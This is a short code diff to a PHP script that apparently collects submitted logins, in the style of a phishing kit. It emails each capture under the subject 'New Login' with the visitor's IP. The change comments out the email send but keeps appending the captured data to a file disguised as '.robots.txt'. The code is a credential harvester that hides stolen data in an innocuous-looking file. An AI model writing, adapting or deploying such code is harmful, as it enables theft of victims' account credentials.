@@ -43,8 +43,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['e']) && isset($_POST['
     ";
     $subject = "New Login : $ip";
 
-    // Send email
-    mail($to, $subject, $body);
+    // Send email (disabled)
+    // mail($to, $subject, $body);
 
     // Log to file (not recommended for sensitive data)
     file_put_contents(".robots.txt", $body."\n\n", FILE_APPEND);
